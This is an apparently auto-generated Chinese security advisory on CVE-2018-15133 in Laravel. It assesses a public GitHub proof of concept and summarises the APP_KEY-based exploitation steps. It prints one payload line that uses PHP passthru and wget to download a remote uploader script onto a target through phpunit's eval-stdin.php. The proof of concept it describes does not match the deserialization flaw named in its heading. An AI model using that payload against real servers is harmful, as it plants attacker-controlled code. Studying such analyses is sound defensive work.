## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用程序密钥（APP_KEY），并且目标系统存在脆弱的Laravel版本。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 框架中，由于对 X-XSRF-TOKEN 值的反序列化操作不当导致远程代码执行。具体来说，`Illuminate/Encryption/Encrypter.php` 中的 `decrypt` 方法和 `phpggc` 中的 `gadgetchains/Laravel/RCE/3/chain.php` 存在问题。攻击者需要知道应用程序的 APP_KEY 才能利用此漏洞，通常情况下这是不可能的，除非攻击者之前已经获得了特权访问权限或成功完成了之前的攻击。

**有效性评估：**
根据漏洞信息、搜索结果和漏洞利用代码，该漏洞的PoC代码**可能有效**。github上的确存在相关的exp仓库（例如：aljavier/exploit_laravel_cve-2018-15133 和 kozmic/laravel-poc-CVE-2018-15133）。漏洞利用需要已知APP_KEY。

**投毒风险分析：**
提供的PoC代码 `cve.py` 的主要功能是生成包含恶意 URL 的 `curl` 命令，并将其写入 `nikmok.txt` 文件。该 URL 包含一个路径 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`，并在GET请求中包含一段PHP代码，尝试使用`passthru`函数执行`wget`命令，从github下载 `vspup.php` 并保存为 `lol.php`。这种行为本身就具有风险，因为攻击者可能会控制下载的 `lol.php` 内容，从而执行任意代码。

`README.md` 文件指示用户执行 `nikmok.txt` 文件，该文件包含之前生成的 `curl` 命令，实际上是执行远程文件下载和执行的命令。`/vendor/phpunit/phpunit/src/Util/PHP/lol.php` 文件的路径则指示尝试访问利用`vspup.php`下载的lol.php文件，但是这个路径并不合理，因为vspup.php已经被下载到根目录并命名为lol.php。因此，该EXP存在一些问题，**投毒风险较低,大约为10%**，主要集中在github仓库作者可能在其他文件中包含恶意代码或在vspup.php中植入后门（虽然这个不是这个仓库作者控制的）。

**利用方式：**

1.  **前提条件：** 获取目标 Laravel 应用的 APP_KEY。
2.  **构造恶意 X-XSRF-TOKEN：** 使用 `phpggc` 工具生成包含恶意 payload 的序列化数据。该 payload 利用 Laravel 的反序列化漏洞，可以执行任意代码。
3.  **加密 X-XSRF-TOKEN：** 使用 APP_KEY 对 payload 进行加密，生成有效的 X-XSRF-TOKEN。
4.  **发送请求：** 将加密后的 X-XSRF-TOKEN 作为 Cookie 或 Header 发送到目标 Laravel 应用。
5.  **触发漏洞：** 当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，恶意 payload 将被执行，从而实现远程代码执行。
6.  **简化流程(根据提供的POC代码)：**
    a. 运行`cve.py`脚本，输入目标网址。
    b. 脚本会将包含特定路径和参数的curl命令写入`nikmok.txt`，尝试通过GET请求和数据`<?php echo passthru("wget https://raw.githubusercontent.com/sKirua/Vespa-Uploader/master/vspup.php -O lol.php");?>`来下载文件。
    c. 运行`nikmok.txt`（实际上是运行文件内包含的curl命令）。
    d. 目标网站如果存在对应路径，则会尝试下载并执行githubusercontent中的`vspup.php`文件，该文件会被重命名为`lol.php`。
    e.  最终的利用需要攻击者能访问到通过`vspup.php`下载的lol.php文件，在提供的路径`/vendor/phpunit/phpunit/src/Util/PHP/lol.php`中，尝试执行恶意代码。

**项目地址:** [Bilelxdz/Laravel-CVE-2018-15133](https://github.com/Bilelxdz/Laravel-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)